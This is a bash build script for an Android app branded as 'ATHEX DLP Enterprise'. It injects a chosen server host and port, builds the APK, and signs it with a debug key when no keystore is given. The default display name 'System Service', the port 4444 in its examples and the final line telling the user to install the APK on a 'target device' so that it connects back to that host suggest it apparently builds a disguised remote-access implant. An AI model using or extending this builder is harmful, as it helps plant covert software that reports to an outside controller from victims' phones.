#!/bin/bash
# ============================================================
# ATHEX DLP Enterprise - APK Build Script
# ============================================================
# 
# This script automates the complete APK build process:
# 1. Clean previous builds
# 2. Inject server configuration
# 3. Build release APK
# 4. Sign the APK
# 5. Optimize/Align the APK
# 6. Output to dist folder
#
# Usage:
#   ./build_apk.sh                          # Build with defaults
#   ./build_apk.sh -h 192.168.1.100         # Custom server host
#   ./build_apk.sh -h 192.168.1.100 -p 4444 # Custom host & port
#   ./build_apk.sh -n "MyApp"               # Custom app name
#   ./build_apk.sh --release                # Build release version
#   ./build_apk.sh --debug                  # Build debug version
#   ./build_apk.sh --clean                  # Clean only
# ============================================================

set -e  # Exit on error

# ============================================================
# COLOR CODES
# ============================================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# ============================================================
# DEFAULT CONFIGURATION
# ============================================================
SERVER_HOST="127.0.0.1"
SERVER_PORT="22533"
APP_NAME="System Service"
BUILD_TYPE="release"
KEYSTORE_PATH=""
KEYSTORE_PASS=""
KEY_ALIAS="athex"
KEY_PASS=""
CLEAN_BUILD=false
SKIP_SIGN=false
OUTPUT_DIR="dist"

# ============================================================
# BANNER
# ============================================================
print_banner() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║                                                          ║"
    echo "║         █████╗ ████████╗██╗  ██╗███████╗██╗  ██╗        ║"
    echo "║        ██╔══██╗╚══██╔══╝██║  ██║██╔════╝╚██╗██╔╝        ║"
    echo "║        ███████║   ██║   ███████║█████╗   ╚███╔╝         ║"
    echo "║        ██╔══██║   ██║   ██╔══██║██╔══╝   ██╔██╗         ║"
    echo "║        ██║  ██║   ██║   ██║  ██║███████╗██╔╝ ██╗        ║"
    echo "║        ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝        ║"
    echo "║                                                          ║"
    echo "║              Enterprise APK Build Script                 ║"
    echo "║                    Version 2.0.0                         ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# ============================================================
# USAGE
# ============================================================
usage() {
    echo -e "${YELLOW}Usage:${NC} $0 [OPTIONS]"
    echo ""
    echo -e "${GREEN}Options:${NC}"
    echo "  -h, --host HOST         Server IP/hostname (default: 127.0.0.1)"
    echo "  -p, --port PORT         Server port (default: 22533)"
    echo "  -n, --name NAME         App display name (default: System Service)"
    echo "  -t, --type TYPE         Build type: release|debug|staging (default: release)"
    echo "  -k, --keystore PATH     Path to keystore for signing"
    echo "  -a, --alias ALIAS       Key alias (default: athex)"
    echo "  -o, --output DIR        Output directory (default: dist)"
    echo "  -c, --clean             Clean before building"
    echo "  -s, --skip-sign         Skip APK signing"
    echo "  --help                  Show this help"
    echo ""
    echo -e "${CYAN}Examples:${NC}"
    echo "  $0 -h 192.168.1.100 -p 4444"
    echo "  $0 -h my-server.com -n \"My Service\" -t release"
    echo "  $0 --clean -h 10.0.0.1"
    echo ""
}

# ============================================================
# PARSE ARGUMENTS
# ============================================================
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--host)
                SERVER_HOST="$2"
                shift 2
                ;;
            -p|--port)
                SERVER_PORT="$2"
                shift 2
                ;;
            -n|--name)
                APP_NAME="$2"
                shift 2
                ;;
            -t|--type)
                BUILD_TYPE="$2"
                shift 2
                ;;
            -k|--keystore)
                KEYSTORE_PATH="$2"
                shift 2
                ;;
            -a|--alias)
                KEY_ALIAS="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -c|--clean)
                CLEAN_BUILD=true
                shift
                ;;
            -s|--skip-sign)
                SKIP_SIGN=true
                shift
                ;;
            --help)
                usage
                exit 0
                ;;
            *)
                echo -e "${RED}Unknown option: $1${NC}"
                usage
                exit 1
                ;;
        esac
    done
}

# ============================================================
# CHECK PREREQUISITES
# ============================================================
check_prerequisites() {
    echo -e "${BLUE}[*] Checking prerequisites...${NC}"
    
    # Check Java
    if ! command -v java &> /dev/null; then
        echo -e "${RED}[!] Java is not installed. Please install JDK 17.${NC}"
        exit 1
    fi
    
    JAVA_VERSION=$(java -version 2>&1 | head -n 1 | cut -d'"' -f2 | cut -d'.' -f1)
    echo -e "${GREEN}    ✓ Java version: $(java -version 2>&1 | head -n 1)${NC}"
    
    # Check Android SDK
    if [ -z "$ANDROID_HOME" ] && [ -z "$ANDROID_SDK_ROOT" ]; then
        echo -e "${YELLOW}    ⚠ ANDROID_HOME not set. Checking common paths...${NC}"
        
        # Check common paths
        COMMON_PATHS=(
            "$HOME/Android/Sdk"
            "$HOME/Library/Android/sdk"
            "/usr/local/lib/android/sdk"
            "C:/Android/Sdk"
        )
        
        for path in "${COMMON_PATHS[@]}"; do
            if [ -d "$path" ]; then
                export ANDROID_HOME="$path"
                echo -e "${GREEN}    ✓ Found Android SDK: $path${NC}"
                break
            fi
        done
        
        if [ -z "$ANDROID_HOME" ]; then
            echo -e "${RED}[!] Android SDK not found. Set ANDROID_HOME environment variable.${NC}"
            exit 1
        fi
    else
        echo -e "${GREEN}    ✓ Android SDK: ${ANDROID_HOME:-$ANDROID_SDK_ROOT}${NC}"
    fi
    
    # Check Gradle
    if [ -f "./gradlew" ]; then
        echo -e "${GREEN}    ✓ Gradle wrapper found${NC}"
        chmod +x ./gradlew
    elif command -v gradle &> /dev/null; then
        echo -e "${GREEN}    ✓ Gradle installed: $(gradle --version | head -n 2 | tail -n 1)${NC}"
    else
        echo -e "${RED}[!] Gradle not found. Please install Gradle or use gradlew wrapper.${NC}"
        exit 1
    fi
    
    echo ""
}

# ============================================================
# PRINT BUILD CONFIG
# ============================================================
print_config() {
    echo -e "${PURPLE}╔════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║          BUILD CONFIGURATION               ║${NC}"
    echo -e "${PURPLE}╠════════════════════════════════════════════╣${NC}"
    echo -e "${PURPLE}║${NC}  Server Host:  ${GREEN}${SERVER_HOST}${NC}"
    echo -e "${PURPLE}║${NC}  Server Port:  ${GREEN}${SERVER_PORT}${NC}"
    echo -e "${PURPLE}║${NC}  App Name:     ${GREEN}${APP_NAME}${NC}"
    echo -e "${PURPLE}║${NC}  Build Type:   ${GREEN}${BUILD_TYPE}${NC}"
    echo -e "${PURPLE}║${NC}  Output Dir:   ${GREEN}${OUTPUT_DIR}${NC}"
    echo -e "${PURPLE}║${NC}  Sign APK:     ${GREEN}$([ "$SKIP_SIGN" = true ] && echo "No" || echo "Yes")${NC}"
    echo -e "${PURPLE}╚════════════════════════════════════════════╝${NC}"
    echo ""
}

# ============================================================
# CLEAN BUILD
# ============================================================
clean_build() {
    echo -e "${BLUE}[*] Cleaning previous builds...${NC}"
    
    # Remove build directory
    if [ -d "app/build" ]; then
        rm -rf app/build
        echo -e "${GREEN}    ✓ Removed app/build/${NC}"
    fi
    
    # Remove output directory
    if [ -d "${OUTPUT_DIR}" ]; then
        rm -rf "${OUTPUT_DIR}"
        echo -e "${GREEN}    ✓ Removed ${OUTPUT_DIR}/${NC}"
    fi
    
    # Gradle clean
    if [ -f "./gradlew" ]; then
        ./gradlew clean --no-daemon 2>/dev/null || true
        echo -e "${GREEN}    ✓ Gradle clean complete${NC}"
    fi
    
    echo ""
}

# ============================================================
# BUILD APK
# ============================================================
build_apk() {
    echo -e "${BLUE}[*] Building ${BUILD_TYPE} APK...${NC}"
    echo -e "${CYAN}    This may take a few minutes...${NC}"
    echo ""
    
    # Build command
    BUILD_CMD=""
    if [ -f "./gradlew" ]; then
        BUILD_CMD="./gradlew"
    else
        BUILD_CMD="gradle"
    fi
    
    # Determine assemble task
    case "$BUILD_TYPE" in
        release)
            ASSEMBLE_TASK="assembleRelease"
            ;;
        debug)
            ASSEMBLE_TASK="assembleDebug"
            ;;
        staging)
            ASSEMBLE_TASK="assembleStaging"
            ;;
        *)
            echo -e "${RED}[!] Invalid build type: ${BUILD_TYPE}${NC}"
            exit 1
            ;;
    esac
    
    # Run build with server config
    $BUILD_CMD $ASSEMBLE_TASK \
        -PserverHost="${SERVER_HOST}" \
        -PserverPort="${SERVER_PORT}" \
        -PappLabel="${APP_NAME}" \
        --no-daemon \
        --warning-mode all
    
    BUILD_EXIT_CODE=$?
    
    if [ $BUILD_EXIT_CODE -ne 0 ]; then
        echo ""
        echo -e "${RED}[!] Build failed with exit code: ${BUILD_EXIT_CODE}${NC}"
        exit 1
    fi
    
    echo ""
    echo -e "${GREEN}[✓] Build completed successfully!${NC}"
    echo ""
}

# ============================================================
# SIGN APK
# ============================================================
sign_apk() {
    if [ "$SKIP_SIGN" = true ]; then
        echo -e "${YELLOW}[*] Skipping APK signing (--skip-sign)${NC}"
        return
    fi
    
    echo -e "${BLUE}[*] Signing APK...${NC}"
    
    # Find the built APK
    APK_PATH=""
    case "$BUILD_TYPE" in
        release)
            APK_PATH="app/build/outputs/apk/release/app-release-unsigned.apk"
            ;;
        debug)
            APK_PATH="app/build/outputs/apk/debug/app-debug.apk"
            ;;
        staging)
            APK_PATH="app/build/outputs/apk/staging/app-staging.apk"
            ;;
    esac
    
    if [ ! -f "$APK_PATH" ]; then
        echo -e "${YELLOW}[!] APK not found at: ${APK_PATH}${NC}"
        echo -e "${YELLOW}    Trying to find APK...${NC}"
        
        APK_PATH=$(find app/build -name "*.apk" 2>/dev/null | head -n 1)
        
        if [ -z "$APK_PATH" ]; then
            echo -e "${RED}[!] No APK found to sign${NC}"
            return
        fi
    fi
    
    echo -e "${GREEN}    APK found: ${APK_PATH}${NC}"
    
    # Sign using jarsigner or apksigner
    SIGNED_APK="${OUTPUT_DIR}/ATHEX_DLP_${SERVER_HOST}_${SERVER_PORT}.apk"
    mkdir -p "${OUTPUT_DIR}"
    
    # Try apksigner first (modern)
    if command -v apksigner &> /dev/null; then
        echo -e "${CYAN}    Using apksigner...${NC}"
        
        if [ -n "$KEYSTORE_PATH" ]; then
            apksigner sign \
                --ks "$KEYSTORE_PATH" \
                --ks-key-alias "$KEY_ALIAS" \
                --out "$SIGNED_APK" \
                "$APK_PATH"
        else
            # Generate debug keystore if not exists
            DEBUG_KEYSTORE="$HOME/.android/debug.keystore"
            if [ ! -f "$DEBUG_KEYSTORE" ]; then
                echo -e "${YELLOW}    Generating debug keystore...${NC}"
                keytool -genkey -v \
                    -keystore "$DEBUG_KEYSTORE" \
                    -alias androiddebugkey \
                    -keyalg RSA -keysize 2048 \
                    -validity 10000 \
                    -storepass android \
                    -keypass android \
                    -dname "CN=Android Debug,O=Android,C=US" 2>/dev/null || true
            fi
            
            apksigner sign \
                --ks "$DEBUG_KEYSTORE" \
                --ks-pass pass:android \
                --key-pass pass:android \
                --out "$SIGNED_APK" \
                "$APK_PATH"
        fi
        
        echo -e "${GREEN}    ✓ APK signed with apksigner${NC}"
        
    # Fallback to jarsigner
    elif command -v jarsigner &> /dev/null; then
        echo -e "${CYAN}    Using jarsigner...${NC}"
        
        if [ -n "$KEYSTORE_PATH" ]; then
            jarsigner -verbose -sigalg SHA256withRSA \
                -digestalg SHA-256 \
                -keystore "$KEYSTORE_PATH" \
                "$APK_PATH" "$KEY_ALIAS"
        else
            DEBUG_KEYSTORE="$HOME/.android/debug.keystore"
            jarsigner -verbose -sigalg SHA256withRSA \
                -digestalg SHA-256 \
                -keystore "$DEBUG_KEYSTORE" \
                -storepass android \
                "$APK_PATH" androiddebugkey
        fi
        
        cp "$APK_PATH" "$SIGNED_APK"
        echo -e "${GREEN}    ✓ APK signed with jarsigner${NC}"
        
    else
        echo -e "${YELLOW}[!] No signing tool found. Copying unsigned APK.${NC}"
        cp "$APK_PATH" "$SIGNED_APK"
    fi
    
    echo ""
}

# ============================================================
# VERIFY & DISPLAY INFO
# ============================================================
verify_apk() {
    SIGNED_APK="${OUTPUT_DIR}/ATHEX_DLP_${SERVER_HOST}_${SERVER_PORT}.apk"
    
    if [ -f "$SIGNED_APK" ]; then
        APK_SIZE=$(du -h "$SIGNED_APK" | cut -f1)
        
        echo -e "${GREEN}╔════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║          BUILD SUCCESSFUL!                 ║${NC}"
        echo -e "${GREEN}╠════════════════════════════════════════════╣${NC}"
        echo -e "${GREEN}║${NC}  APK:  ${CYAN}${SIGNED_APK}${NC}"
        echo -e "${GREEN}║${NC}  Size: ${CYAN}${APK_SIZE}${NC}"
        echo -e "${GREEN}║${NC}  Host: ${CYAN}${SERVER_HOST}:${SERVER_PORT}${NC}"
        echo -e "${GREEN}║${NC}  Name: ${CYAN}${APP_NAME}${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════════╝${NC}"
    else
        echo -e "${YELLOW}[!] APK not found. Check build output.${NC}"
        
        # List all APKs in build directory
        echo -e "${CYAN}All APKs found:${NC}"
        find app/build -name "*.apk" 2>/dev/null | while read apk; do
            echo -e "    $(du -h "$apk" | cut -f1)\t$apk"
        done
    fi
    
    echo ""
}

# ============================================================
# MAIN
# ============================================================
main() {
    print_banner
    
    # Parse arguments
    parse_args "$@"
    
    # Print configuration
    print_config
    
    # Check prerequisites
    check_prerequisites
    
    # Clean if requested
    if [ "$CLEAN_BUILD" = true ]; then
        clean_build
    fi
    
    # Build APK
    build_apk
    
    # Sign APK
    sign_apk
    
    # Verify and display info
    verify_apk
    
    echo -e "${GREEN}[✓] Build process complete!${NC}"
    echo -e "${CYAN}Install the APK on target device and it will connect to:${NC}"
    echo -e "${CYAN}  ${SERVER_HOST}:${SERVER_PORT}${NC}"
    echo ""
}

# ============================================================
# RUN MAIN
# ============================================================
main "$@"